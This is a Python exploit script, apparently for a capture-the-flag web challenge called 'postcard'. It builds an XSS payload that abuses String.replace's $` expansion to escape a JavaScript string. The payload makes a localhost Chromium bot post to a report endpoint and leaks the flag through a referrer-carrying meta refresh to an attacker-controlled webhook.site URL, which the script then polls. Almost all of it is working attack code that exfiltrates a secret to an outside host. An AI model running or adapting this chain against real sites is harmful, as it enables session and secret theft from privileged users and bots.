#!/usr/bin/env python3
import json
import sys
import time
import urllib.parse
import urllib.request


target = (sys.argv[1] if len(sys.argv) > 1 else "http://154.57.164.77:31781").rstrip("/")

# Create an ephemeral collection endpoint.
request = urllib.request.Request("https://webhook.site/token", method="POST")
request.add_header("Accept", "application/json")
with urllib.request.urlopen(request) as response:
    hook_id = json.load(response)["uuid"]

# The protected bot later renders this value without escaping. Referrer policy makes
# its cross-origin meta refresh disclose the full URL, including ?flag=HTB{...}.
html = (
    "</title><meta name=referrer content=unsafe-url>"
    f"<meta http-equiv=refresh content=0;url=https://webhook.site/{hook_id}/flag>"
)

# postcard's renderTemplate passes user data as String.replace's replacement value.
# $` expands to the text before {{ secret }}, contributing a real quote that escapes
# the JS string despite the application's HTML escaping. Build '<'/'>' at runtime.
codes = ",".join(map(str, html.encode()))
fallback_html = (
    "</title><meta name=referrer content=unsafe-url>"
    f"<meta http-equiv=refresh content=0;url=https://webhook.site/{hook_id}/fallback>"
)
fallback_path = "destinations?" + urllib.parse.urlencode({"name": fallback_html})
fallback_body = urllib.parse.urlencode({"path": fallback_path})
js = (
    "$`;fetch(`/report`,{method:`POST`,headers:{"
    "[`Content-Type`]:`application/x-www-form-urlencoded`,"
    f"[`X-Carta-Auth-Key`]:String.fromCharCode({codes})"
    f"}},body:`{fallback_body}`}}); //"
)
query = urllib.parse.urlencode({
    "recipient": "a",
    "sender": "b",
    "message": "c",
    "secret": js,
})

# The public report branch asks the localhost Chromium bot to visit our postcard.
body = urllib.parse.urlencode({"path": f"postcard?{query}"}).encode()
request = urllib.request.Request(f"{target}/report", data=body, method="POST")
request.add_header("Content-Type", "application/x-www-form-urlencoded")
urllib.request.urlopen(request).read()

api = f"https://webhook.site/token/{hook_id}/requests?sorting=newest"
for _ in range(12):
    time.sleep(2)
    with urllib.request.urlopen(api) as response:
        requests = json.load(response)["data"]
    for item in requests:
        referer = item.get("headers", {}).get("referer", [""])
        if isinstance(referer, list):
            referer = referer[0]
        flag = urllib.parse.parse_qs(urllib.parse.urlsplit(referer).query).get("flag")
        if flag:
            print(flag[0])
            raise SystemExit

raise SystemExit("No flag received; retry while the instance is active")
